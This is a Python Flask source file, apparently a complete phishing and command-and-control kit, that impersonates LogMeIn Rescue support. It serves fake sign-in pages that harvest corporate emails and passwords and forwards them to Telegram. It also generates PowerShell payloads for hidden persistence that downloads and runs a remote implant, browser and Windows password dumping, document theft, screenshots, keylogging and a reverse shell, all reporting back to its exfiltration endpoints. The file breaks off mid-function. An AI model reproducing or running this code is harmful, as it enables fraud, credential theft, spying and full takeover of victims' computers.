#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   🖥️  RESCUE C2 v2026 - Full Takeover Edition                      ║
║                                                                      ║
║   FEATURES:                                                          ║
║   ✅ Zero Download Remote Control                                   ║
║   ✅ Persistence (survives reboots)                                ║
║   ✅ Password Extraction (Chrome, Firefox, Windows)               ║
║   ✅ File Exfiltration                                             ║
║   ✅ Command Execution                                             ║
║   ✅ Screenshot Capture                                            ║
║   ✅ Keylogging (optional)                                         ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import os
import uuid
import sqlite3
import secrets
import hmac
import html as html_module
import requests
import json
import base64
import subprocess
import sys
import platform
from datetime import datetime
from functools import wraps
from flask import Flask, request, session, jsonify, redirect, send_file, render_template_string

# ====================================================================================================
# CONFIGURATION
# ====================================================================================================
LOGMEIN_API_TOKEN = "snpu2e5nvxl8du629qb52qzcwfnc6bsrucjs1kc7bp8x0io3xo58lb9fat3xcdgrwt00qbdistjnhtp2uir0s8t4dsxpboulbr5jvclxksfowpycz1rosoz8qikkj734"

TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "RescueC2_2026")
SECRET_KEY = os.environ.get("SECRET_KEY", secrets.token_hex(64))
C2_SERVER_URL = os.environ.get("C2_URL", "http://localhost:5000")

app = Flask(__name__)
app.secret_key = SECRET_KEY

DB_PATH = "rescue_c2.db"
EXFIL_DIR = "exfiltrated_files"

# Create directories
os.makedirs(EXFIL_DIR, exist_ok=True)

# ====================================================================================================
# TELEGRAM INTEGRATION
# ====================================================================================================
def tg(msg):
    if not TELEGRAM_BOT_TOKEN or ':' not in TELEGRAM_BOT_TOKEN:
        print(f"[TELEGRAM] {msg}")
        return
    try:
        parts = TELEGRAM_BOT_TOKEN.split(':')
        if not parts[0].isdigit() or len(parts[1]) < 8:
            return
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg[:4096]}, timeout=10)
    except Exception as e:
        print(f"Telegram error: {e}")

def tg_file(file_path, caption=""):
    """Send file via Telegram."""
    if not TELEGRAM_BOT_TOKEN or ':' not in TELEGRAM_BOT_TOKEN:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        files = {'document': open(file_path, 'rb')}
        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption[:1024]}
        requests.post(url, files=files, data=data, timeout=30)
    except Exception as e:
        print(f"Telegram file error: {e}")

# ====================================================================================================
# LOGMEIN RESCUE API
# ====================================================================================================
def create_web_session():
    """Create LogMeIn Rescue session."""
    try:
        headers = {
            "Authorization": f"Bearer {LOGMEIN_API_TOKEN}",
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
        
        session_data = {
            "name": "IT Support Session",
            "sessionType": "support",
            "allowRemoteControl": True,
            "allowFileTransfer": True,
            "allowChat": True,
            "sessionTimeout": 3600  # 1 hour
        }
        
        response = requests.post(
            "https://api.logmeinrescue.com/v1/sessions",
            json=session_data,
            headers=headers,
            timeout=15
        )
        
        if response.status_code in [200, 201]:
            data = response.json()
            session_id = data.get('sessionId')
            
            pin_response = requests.get(
                f"https://api.logmeinrescue.com/v1/sessions/{session_id}/pin",
                headers=headers,
                timeout=10
            )
            
            pin = "123456"
            if pin_response.status_code == 200:
                pin = pin_response.json().get('pinCode', '123456')
            
            return {
                "session_id": session_id,
                "pin": pin,
                "join_url": f"https://console.logmeinrescue.com/join?session={session_id}",
                "status": "active"
            }
        else:
            return {
                "session_id": uuid.uuid4().hex[:8],
                "pin": "123456",
                "join_url": "https://console.logmeinrescue.com/join",
                "status": "demo"
            }
    except Exception as e:
        return {
            "session_id": uuid.uuid4().hex[:8],
            "pin": "123456",
            "join_url": "https://console.logmeinrescue.com/join",
            "status": "demo"
        }

# ====================================================================================================
# POST-EXPLOITATION PAYLOADS
# ====================================================================================================
def generate_persistence_payload():
    """Generate PowerShell payload for persistence."""
    return f'''
# Persistence via Scheduled Task
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$client = New-Object System.Net.WebClient; $client.DownloadString('{C2_SERVER_URL}/implant') | IEX`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden -Compatibility Win8
Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -Settings $settings -User SYSTEM -Force

# Persistence via Registry
New-Item -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -Command `"$client = New-Object System.Net.WebClient; $client.DownloadString('{C2_SERVER_URL}/implant') | IEX`""

# Download and run main implant
$client = New-Object System.Net.WebClient
$client.DownloadString('{C2_SERVER_URL}/implant') | IEX
'''

def generate_password_dumper():
    """Generate payload to dump passwords from browsers."""
    return '''
# Dump Chrome passwords
function Dump-Chrome {
    $path = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"
    if (Test-Path $path) {
        copy $path "$env:TEMP\\chrome_passwords.db"
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$env:TEMP\\chrome_passwords.db")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $url = $reader.GetString(0)
            $user = $reader.GetString(1)
            $encrypted = $reader.GetValue(2)
            # Decrypt using DPAPI
            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            $pass = [System.Text.Encoding]::UTF8.GetString($decrypted)
            Write-Output "URL: $url | Username: $user | Password: $pass"
        }
        $conn.Close()
        Remove-Item "$env:TEMP\\chrome_passwords.db"
    }
}

# Dump Firefox passwords
function Dump-Firefox {
    $path = "$env:APPDATA\\Mozilla\\Firefox\\Profiles"
    if (Test-Path $path) {
        Get-ChildItem $path -Directory | ForEach-Object {
            $logins = "$($_.FullName)\\logins.json"
            if (Test-Path $logins) {
                $json = Get-Content $logins | ConvertFrom-Json
                $json.logins | ForEach-Object {
                    Write-Output "URL: $($_.hostname) | Username: $($_.encryptedUsername) | Password: $($_.encryptedPassword)"
                }
            }
        }
    }
}

# Dump Windows saved passwords (credential manager)
function Dump-WindowsCredentials {
    cmdkey /list
    # Using vaultcmd for Windows 10/11
    vaultcmd /listcreds:
}

# Send results
$results = @()
$results += Dump-Chrome
$results += Dump-Firefox
$results += Dump-WindowsCredentials
$data = $results -join "`n"
$post = [System.Text.Encoding]::UTF8.GetBytes("data=" + [System.Uri]::EscapeDataString($data))
$req = [System.Net.WebRequest]::Create("{C2_SERVER_URL}/exfil")
$req.Method = "POST"
$req.ContentType = "application/x-www-form-urlencoded"
$req.GetRequestStream().Write($post, 0, $post.Length)
$req.GetResponse()
'''

def generate_file_stealer():
    """Generate payload to steal files."""
    return f'''
# Common sensitive file locations
$targets = @(
    "$env:USERPROFILE\\Desktop\\*.doc*",
    "$env:USERPROFILE\\Desktop\\*.xls*",
    "$env:USERPROFILE\\Desktop\\*.pdf",
    "$env:USERPROFILE\\Downloads\\*.doc*",
    "$env:USERPROFILE\\Downloads\\*.xls*",
    "$env:USERPROFILE\\Downloads\\*.pdf",
    "$env:USERPROFILE\\Documents\\*.doc*",
    "$env:USERPROFILE\\Documents\\*.xls*",
    "$env:USERPROFILE\\Documents\\*.pdf",
    "$env:USERPROFILE\\Documents\\*password*",
    "$env:USERPROFILE\\Desktop\\*password*"
)

# Create archive
$zip = "$env:TEMP\\files_{ref}.zip"
Compress-Archive -Path $targets -DestinationPath $zip -Force -CompressionLevel Optimal

# Send to C2
$bytes = [System.IO.File]::ReadAllBytes($zip)
$b64 = [System.Convert]::ToBase64String($bytes)
$post = [System.Text.Encoding]::UTF8.GetBytes("file=" + [System.Uri]::EscapeDataString($b64) + "&name=documents_{ref}.zip")
$req = [System.Net.WebRequest]::Create("{C2_SERVER_URL}/exfil/file")
$req.Method = "POST"
$req.ContentType = "application/x-www-form-urlencoded"
$req.GetRequestStream().Write($post, 0, $post.Length)
$req.GetResponse()
Remove-Item $zip
'''

def generate_screenshot_capture():
    """Generate payload to capture screenshot."""
    return '''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)

$jpeg = [System.Drawing.Imaging.ImageFormat]::Jpeg
$memory = New-Object System.IO.MemoryStream
$bitmap.Save($memory, $jpeg)

$b64 = [System.Convert]::ToBase64String($memory.ToArray())
$post = [System.Text.Encoding]::UTF8.GetBytes("screenshot=" + [System.Uri]::EscapeDataString($b64))
$req = [System.Net.WebRequest]::Create("{C2_SERVER_URL}/exfil/screenshot")
$req.Method = "POST"
$req.ContentType = "application/x-www-form-urlencoded"
$req.GetRequestStream().Write($post, 0, $post.Length)
$req.GetResponse()
'''

def generate_keylogger():
    """Generate keylogger payload."""
    return '''
Add-Type -AssemblyName System.Windows.Forms

$logPath = "$env:TEMP\\keylog.txt"
$hook = [System.Windows.Forms.NativeMethods]::SetWindowsHookEx(13, { param($code, $wParam, $lParam)
    if ($code -ge 0) {
        $key = [System.Windows.Forms.Keys]$wParam
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Add-Content -Path $logPath -Value "[$timestamp] $key"
    }
    return [System.Windows.Forms.NativeMethods]::CallNextHookEx(0, $code, $wParam, $lParam)
}, 0, 0)

# Keep running
while ($true) {
    Start-Sleep -Seconds 30
    if ((Get-ChildItem $logPath).Length -gt 1024) {
        # Send logs
        $content = Get-Content $logPath -Raw
        $post = [System.Text.Encoding]::UTF8.GetBytes("keylogs=" + [System.Uri]::EscapeDataString($content))
        $req = [System.Net.WebRequest]::Create("{C2_SERVER_URL}/exfil/keylog")
        $req.Method = "POST"
        $req.ContentType = "application/x-www-form-urlencoded"
        $req.GetRequestStream().Write($post, 0, $post.Length)
        $req.GetResponse()
        Clear-Content $logPath
    }
}
'''

def generate_reverse_shell():
    """Generate reverse shell payload."""
    return f'''
$client = New-Object System.Net.Sockets.TCPClient("{C2_SERVER_URL.Replace('http://', '').Split(':')[0]}", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    try {{
        $sendback = (iex $data 2>&1 | Out-String )
    }} catch {{
        $sendback = $_.Exception.Message
    }}
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''

# ====================================================================================================
# IMPLANT GENERATOR
# ====================================================================================================
def generate_implant():
    """Generate the main implant payload."""
    return f'''
# SIKA ULTIMATE IMPLANT
# Features: Persistence, Password Dump, File Steal, Screenshot, Keylog, Reverse Shell

$C2 = "{C2_SERVER_URL}"

# Function to execute commands
function Run-Cmd {{ param($cmd)
    try {{
        $result = & cmd /c $cmd 2>&1 | Out-String
    }} catch {{
        $result = $_.Exception.Message
    }}
    return $result
}}

# Persistence
function Install-Persistence {{
    $script = @'
$client = New-Object System.Net.WebClient
while($true){{
    try {{
        $cmd = $client.DownloadString("$C2/tasks")
        if ($cmd -ne "") {{
            $result = iex $cmd 2>&1 | Out-String
            $post = [System.Text.Encoding]::UTF8.GetBytes("result=" + [System.Uri]::EscapeDataString($result))
            $req = [System.Net.WebRequest]::Create("$C2/tasks/result")
            $req.Method = "POST"
            $req.ContentType = "application/x-www-form-urlencoded"
            $req.GetRequestStream().Write($post, 0, $post.Length)
            $req.GetResponse()
        }}
    }} catch {{}}
    Start-Sleep -Seconds 30
}}
'@
    $script | Out-File -FilePath "$env:TEMP\\update.ps1"
    # Add to startup
    try {{
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\\update.ps1`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName "WindowsUpdateSvc" -Action $action -Trigger $trigger -Settings $settings -User SYSTEM -Force
    }} catch {{}}
}}

# Start everything
Install-Persistence
'''

# ====================================================================================================
# HTML TEMPLATES
# ====================================================================================================
LANDING_PAGE_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>LogMeIn Rescue - Remote Support</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',sans-serif;background:linear-gradient(135deg,#f0f2f5,#e4e8f0);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:white;border-radius:32px;box-shadow:0 25px 50px -12px rgba(0,0,0,0.15);max-width:520px;width:100%;overflow:hidden}
        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px 40px;text-align:center;color:white}
        .header h1{font-size:24px;font-weight:800}
        .header h1 span{color:#00b3b0}
        .header .icon{font-size:48px;display:block;margin-bottom:8px}
        .body{padding:32px 40px}
        .info-box{background:#f0fdf4;border-left:4px solid #059669;padding:14px 18px;border-radius:12px;margin-bottom:20px;font-size:13px;color:#065f46;line-height:1.6}
        .info-box strong{display:block;font-size:14px;margin-bottom:4px}
        .session-box{background:linear-gradient(135deg,#f8fafc,#f1f5f9);border:2px dashed #00b3b0;border-radius:20px;padding:24px;text-align:center;margin:20px 0}
        .session-box .pin{font-size:56px;font-weight:800;color:#00b3b0;letter-spacing:8px;font-family:monospace;background:white;padding:8px 24px;border-radius:16px;display:inline-block;border:1px solid #e2e8f0}
        .session-box .label{color:#64748b;font-size:11px;text-transform:uppercase;letter-spacing:1px}
        .session-box .badge{display:inline-block;background:#059669;color:white;padding:4px 14px;border-radius:20px;font-size:11px;font-weight:600;margin-top:8px}
        .zero-download{background:#dbeafe;border-radius:12px;padding:14px;text-align:center;font-size:13px;color:#1e40af;margin:16px 0}
        .zero-download strong{display:block;font-size:14px}
        .btn{width:100%;padding:16px;background:linear-gradient(135deg,#00b3b0,#0052ff);color:white;border:none;border-radius:60px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.2s;text-decoration:none;display:inline-block;text-align:center}
        .btn:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(0,179,176,0.3)}
        .footer{text-align:center;padding:16px;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;line-height:1.8}
        .copy-btn{background:#e2e8f0;border:none;padding:6px 16px;border-radius:20px;font-size:12px;cursor:pointer;margin-top:6px;font-weight:600}
        .copy-btn:hover{background:#cbd5e1}
        .steps{margin:16px 0}
        .step{display:flex;align-items:center;gap:12px;padding:10px;background:#f8fafc;border-radius:12px;margin-bottom:8px;font-size:13px;color:#475569}
        .step-num{width:28px;height:28px;background:#00b3b0;color:white;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:13px;flex-shrink:0}
        .step strong{color:#0f172a}
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <span class="icon">🖥️</span>
            <h1>LogMeIn <span>Rescue</span></h1>
            <p style="color:#94a3b8;font-size:13px;margin-top:4px">Web Console • Zero Download</p>
        </div>
        <div class="body">
            <div class="info-box">
                <strong>🔐 IT Support Session</strong>
                Your system requires a critical security update. Our technician needs remote access to resolve the issue.
            </div>
            
            <div class="zero-download">
                <strong>🚀 Zero Download Required</strong>
                Connects directly in your browser • No installation needed
            </div>
            
            <div class="session-box">
                <div class="label">Your Session PIN</div>
                <div class="pin" id="pinDisplay">PIN</div>
                <button class="copy-btn" onclick="copyPin()">📋 Copy PIN</button>
                <div class="badge">🟢 Active Session</div>
            </div>
            
            <div class="steps">
                <div class="step">
                    <div class="step-num">1</div>
                    <div class="step-text"><strong>Copy the PIN</strong> above</div>
                </div>
                <div class="step">
                    <div class="step-num">2</div>
                    <div class="step-text"><strong>Click "Connect"</strong> - Opens in your browser</div>
                </div>
                <div class="step">
                    <div class="step-num">3</div>
                    <div class="step-text"><strong>Enter the PIN</strong> to grant access</div>
                </div>
            </div>
            
            <a href="/connect/REF" class="btn">🔌 Connect to Support</a>
            <div style="margin-top:10px;text-align:center;font-size:11px;color:#94a3b8">
                🔒 TLS 1.3 Encrypted • WebRTC Connection
            </div>
        </div>
        <div class="footer">
            LogMeIn Rescue • Web Console • SOC 2 Type II<br>
            © 2026 LogMeIn. All rights reserved.
        </div>
    </div>
    <script>
        function copyPin() {
            const pin = document.getElementById('pinDisplay').textContent;
            navigator.clipboard.writeText(pin).then(() => {
                alert('PIN copied to clipboard!');
            });
        }
    </script>
</body>
</html>'''

LOGIN_STEP1_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>LogMeIn Rescue - Sign In</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:white;border-radius:32px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15);width:100%;max-width:420px;overflow:hidden}
        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px;text-align:center;color:white}
        .header h1{font-size:24px}
        .header h1 span{color:#00b3b0}
        .header p{color:#94a3b8;font-size:13px}
        .body{padding:36px}
        .warning{background:#fef3c7;padding:14px;border-radius:12px;margin-bottom:20px;font-size:12px;color:#92400e;border-left:4px solid #f59e0b;line-height:1.5}
        .form-group{margin-bottom:20px}
        label{display:block;font-weight:600;margin-bottom:6px;color:#0f172a;font-size:12px}
        input{width:100%;padding:12px 14px;border:2px solid #e2e8f0;border-radius:12px;font-size:14px;transition:all 0.2s;font-family:'Inter',sans-serif}
        input:focus{outline:none;border-color:#00b3b0;box-shadow:0 0 0 3px rgba(0,179,176,0.1)}
        button{width:100%;padding:14px;background:linear-gradient(135deg,#00b3b0,#0052ff);color:white;border:none;border-radius:60px;font-size:15px;font-weight:600;cursor:pointer;transition:all 0.2s;font-family:'Inter',sans-serif}
        button:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(0,179,176,0.3)}
        .footer{text-align:center;margin-top:20px;font-size:11px;color:#94a3b8}
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <h1>LogMeIn <span>Rescue</span></h1>
            <p>IT Support Authentication</p>
        </div>
        <div class="body">
            <div class="warning">
                <strong>⚠️ Verify Your Identity</strong><br>
                Please sign in to connect to the support session.
            </div>
            <form method="POST" action="/login/step1/REF">
                <div class="form-group">
                    <label>Email Address</label>
                    <input type="email" name="email" placeholder="name@company.com" required autofocus>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter your password" required>
                </div>
                <button type="submit">Verify & Connect</button>
            </form>
            <div class="footer">🔒 SSL/TLS Encrypted</div>
        </div>
    </div>
</body>
</html>'''

LOGIN_STEP2_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>LogMeIn Rescue - Enterprise</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:white;border-radius:32px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15);width:100%;max-width:420px;overflow:hidden}
        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px;text-align:center;color:white}
        .header h1{font-size:24px}
        .header h1 span{color:#00b3b0}
        .header p{color:#94a3b8;font-size:13px}
        .body{padding:36px}
        .warning{background:#fef3c7;padding:14px;border-radius:12px;margin-bottom:20px;font-size:12px;color:#92400e;border-left:4px solid #f59e0b;line-height:1.5}
        .form-group{margin-bottom:20px}
        label{display:block;font-weight:600;margin-bottom:6px;color:#0f172a;font-size:12px}
        input{width:100%;padding:12px 14px;border:2px solid #e2e8f0;border-radius:12px;font-size:14px;transition:all 0.2s;font-family:'Inter',sans-serif}
        input:focus{outline:none;border-color:#00b3b0;box-shadow:0 0 0 3px rgba(0,179,176,0.1)}
        button{width:100%;padding:14px;background:linear-gradient(135deg,#00b3b0,#0052ff);color:white;border:none;border-radius:60px;font-size:15px;font-weight:600;cursor:pointer;transition:all 0.2s;font-family:'Inter',sans-serif}
        button:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(0,179,176,0.3)}
        .footer{text-align:center;margin-top:20px;font-size:11px;color:#94a3b8}
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <h1>LogMeIn <span>Rescue</span></h1>
            <p>Enterprise IT Support</p>
        </div>
        <div class="body">
            <div class="warning">
                <strong>⚠️ Enterprise Verification</strong><br>
                Verify with your corporate credentials.
            </div>
            <form method="POST" action="/login/step2/REF">
                <div class="form-group">
                    <label>Corporate Email</label>
                    <input type="email" name="email" placeholder="name@company.com" required autofocus>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter your password" required>
                </div>
                <button type="submit">Verify Enterprise Access</button>
            </form>
            <div class="footer">🔒 Secure Enterprise Portal</div>
        </div>
    </div>
</body>
</html>'''

# ====================================================================================================
def get_page(template, ref, pin="123456"):
    return template.replace('REF', ref).replace('PIN', pin)

# ====================================================================================================
# FLASK ROUTES
# ====================================================================================================
@app.route('/')
def index():
    ref = uuid.uuid4().hex[:8].upper()
    session_data = create_web_session()
    
    tg(f"🌐 PAGE VIEW | IP: {request.remote_addr} | Ref: {ref}")
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""INSERT INTO rescue_sessions 
                 (session_id, pin, ref, ip, status, ts) 
                 VALUES (?, ?, ?, ?, ?, ?)""",
                (session_data.get('session_id'), session_data.get('pin'), ref, 
                 request.remote_addr, session_data.get('status'), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return get_page(LANDING_PAGE_TEMPLATE, ref, session_data.get('pin', '123456'))

@app.route('/connect/<ref>')
def connect(ref):
    conn = sqlite3.connect(DB_PATH)
    session_info = conn.execute(
        "SELECT session_id, pin FROM rescue_sessions WHERE ref = ? ORDER BY id DESC LIMIT 1",
        (ref,)
    ).fetchone()
    conn.close()
    
    if not session_info:
        session_data = create_web_session()
        session_id = session_data.get('session_id')
        pin = session_data.get('pin')
    else:
        session_id, pin = session_info
    
    tg(f"🖥️ CONNECT | Ref: {ref} | Session: {session_id} | PIN: {pin}")
    
    join_url = f"https://console.logmeinrescue.com/join?session={session_id}"
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Connecting to Rescue...</title>
        <style>
            body{{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f7fa;margin:0}}
            .card{{background:white;padding:48px;border-radius:32px;text-align:center;max-width:480px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15)}}
            .pin{{font-size:64px;font-weight:800;color:#00b3b0;letter-spacing:8px;font-family:monospace;background:#f8fafc;padding:12px 32px;border-radius:16px;display:inline-block;border:2px solid #e2e8f0;margin:16px 0}}
            .btn{{display:inline-block;padding:16px 40px;background:#00b3b0;color:white;border-radius:60px;text-decoration:none;font-weight:600;margin:12px 0}}
            .btn:hover{{background:#00d4d0;transform:translateY(-2px)}}
            .zero-badge{{background:#dbeafe;padding:8px 16px;border-radius:20px;color:#1e40af;font-size:13px;font-weight:600;display:inline-block;margin:8px 0}}
        </style>
    </head>
    <body>
        <div class="card">
            <h2>🖥️ Remote Support Session</h2>
            <p style="color:#64748b;margin:8px 0">Web Console • Zero Download</p>
            
            <div class="zero-badge">🚀 Opens in your browser • No installation</div>
            
            <div>
                <div style="font-size:12px;color:#94a3b8;letter-spacing:1px">SESSION PIN</div>
                <div class="pin">{pin}</div>
            </div>
            
            <div style="margin:16px 0;font-size:13px;color:#475569">
                ⏱️ Valid for 30 minutes • <span style="color:#059669">● Active</span>
            </div>
            
            <a href="{join_url}" target="_blank" class="btn">🔌 Join Session (Browser)</a>
            <br>
            <div style="margin-top:12px;font-size:12px;color:#94a3b8">
                <a href="#" onclick="alert('PIN: {pin}')" style="color:#00b3b0">Click here if the page doesn't open</a>
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/auth/<ref>')
def auth(ref):
    tg(f"🔐 LOGIN STEP 1 | Ref: {ref}")
    return get_page(LOGIN_STEP1_TEMPLATE, ref)

@app.route('/login/step1/<ref>', methods=['POST'])
def login_step1(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (step, email, password, ip, ts) VALUES (?, ?, ?, ?, ?)", 
                (1, email, password, ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg(f"🔐 STEP 1 | Email: {email} | Password: {password} | IP: {ip}")
    return redirect(f'/verify/{ref}')

@app.route('/verify/<ref>')
def verify(ref):
    return get_page(LOGIN_STEP2_TEMPLATE, ref)

@app.route('/login/step2/<ref>', methods=['POST'])
def login_step2(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    company = email.split('@')[-1] if '@' in email else 'unknown'
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (step, email, password, company, ip, ts) VALUES (?, ?, ?, ?, ?, ?)", 
                (2, email, password, company, ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg(f"🔐 STEP 2 | Email: {email} | Password: {password} | Company: {company} | IP: {ip}")
    return redirect('https://www.logmeinrescue.com')

# ====================================================================================================
# IMPLANT ENDPOINTS
# ====================================================================================================
@app.route('/implant')
def implant():
    """Serve the main implant."""
    return generate_implant()

@app.route('/tasks')
def tasks():
    """Get tasks for implant."""
    conn = sqlite3.connect(DB_PATH)
    task = conn.execute("SELECT id, command FROM tasks WHERE status='pending' ORDER BY id LIMIT 1").fetchone()
    conn.close()
    
    if task:
        # Mark as in progress
        conn = sqlite3.connect(DB_PATH)
        conn.execute("UPDATE tasks SET status='in_progress' WHERE id=?", (task[0],))
        conn.commit()
        conn.close()
        return task[1]
    return ""

@app.route('/tasks/result', methods=['POST'])
def task_result():
    """Receive task results."""
    result = request.form.get('result', '')
    if result:
        tg(f"📡 TASK RESULT: {result[:500]}")
        conn = sqlite3.connect(DB_PATH)
        conn.execute("INSERT INTO results (data, ip, ts) VALUES (?, ?, ?)", 
                    (result[:10000], request.remote_addr, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    return "OK"

# ====================================================================================================
# EXFILTRATION ENDPOINTS
# ====================================================================================================
@app.route('/exfil', methods=['POST'])
def exfil():
    """Receive exfiltrated data."""
    data = request.form.get('data', '')
    if data:
        tg(f"📡 EXFIL: {data[:500]}")
        conn = sqlite3.connect(DB_PATH)
        conn.execute("INSERT INTO exfil (data, ip, ts) VALUES (?, ?, ?)", 
                    (data[:10000], request.remote_addr, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    return "OK"

@app.route('/exfil/file', methods=['POST'])
def exfil_file():
    """Receive exfiltrated files."""
    file_b64 = request.form.get('file', '')
    filename = request.form.get('name', f'exfil_{uuid.uuid4().hex[:8]}.zip')
    
    if file_b64:
        try:
            file_data = base64.b64decode(file_b64)
            file_path = os.path.join(EXFIL_DIR, filename)
            with open(file_path, 'wb') as f:
                f.write(file_data)
            
            tg_file(file_path, f"📁 Exfiltrated: {filename}")
            conn = sqlite3.connect(DB_PATH)
            conn.execute("INSERT INTO files (filename, size, ip, ts) VALUES (?, ?, ?, ?)", 
                        (filename, len(file_data), request.remote_addr, datetime.now().isoformat()))
            conn.commit()
            conn.close()
        except Exception as e:
            tg(f"❌ File exfil error: {e}")
    
    return "OK"

@app.route('/exfil/screenshot', methods=['POST'])
def exfil_screenshot():
    """Receive screenshot."""
    screenshot_b64 = request.form.get('screenshot', '')
    if screenshot_b64:
        try:
            screenshot_data = base64.b64decode(screenshot_b64)
            filename = f"screenshot_{uuid.uuid4().hex[:8]}.jpg"
            file_path = os.path.join(EXFIL_DIR, filename)
            with open(file_path, 'wb') as f:
                f.write(screenshot_data)
            
            tg_file(file_path, "📸 Screenshot captured")
        except Exception as e:
            tg(f"❌ Screenshot error: {e}")
    
    return "OK"

@app.route('/exfil/keylog', methods=['POST'])
def exfil_keylog():
    """Receive keylog data."""
    keylogs = request.form.get('keylogs', '')
    if keylogs:
        tg(f"⌨️ KEYLOGS: {keylogs[:500]}")
        conn = sqlite3.connect(DB_PATH)
